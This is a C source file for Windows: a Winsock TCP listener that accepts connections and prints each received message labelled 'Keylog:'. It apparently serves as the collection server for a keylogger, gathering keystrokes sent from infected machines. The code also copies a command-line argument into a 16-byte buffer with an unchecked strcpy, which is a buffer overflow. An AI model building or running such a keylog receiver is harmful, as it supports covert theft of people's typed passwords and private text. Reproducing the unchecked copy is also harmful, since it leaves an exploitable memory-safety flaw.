#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "Ws2_32.lib") // Link with Ws2_32.lib

int main(int argc, char* argv[]) {
    
    if (argc < 3) {
        printf("Please enter the server IP address and PORT\n");
        printf("USAGE: %s IPv4 Port\n", argv[0]);
        exit(1);
    }

    char tip[16] = {0};
    strcpy(tip, argv[1]);

    int port = atoi(argv[2]);

    char buffer[1024];
    int bytes_received;

    WSADATA wsa;
    SOCKET sock, client_sock;
    struct sockaddr_in addr, client_addr;
    int addrlen = sizeof(client_addr);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Could not create socket: %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    // Setup server address structure
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(tip);

    // Bind the socket to IP and port
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("Bind failed. Error Code: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return EXIT_FAILURE;
    }

    // Start listening for incoming connections
    if (listen(sock, 5) < 0) {
        printf("Listen failed. Error Code: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return EXIT_FAILURE;
    }

    printf("Server listening on %s:%d\n", tip, port);

    while (1) {
        // Accept incoming connection
        client_sock = accept(sock, (struct sockaddr*)&client_addr, &addrlen);
        if (client_sock == INVALID_SOCKET) {
            printf("Accept failed. Error Code: %d\n", WSAGetLastError());
            continue; // Continue listening for the next connection
        }

        // Display client connection information
        printf("Connection accepted from %s:%d\n",
            inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        // Receive data from the client
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received == SOCKET_ERROR) {
                printf("Receive failed. Error Code: %d\n", WSAGetLastError());
                break; // Break out of the loop if an error occurs
            }

            if (bytes_received == 0) {
                printf("Client disconnected.\n");
                break; // Client disconnected
            }

            // Print the received message
            printf("Keylog: %s\n", buffer);
        }

        // Close client socket after communication ends
        closesocket(client_sock);
    }

    // Close the server socket
    closesocket(sock);
    WSACleanup();

    return 0;
}
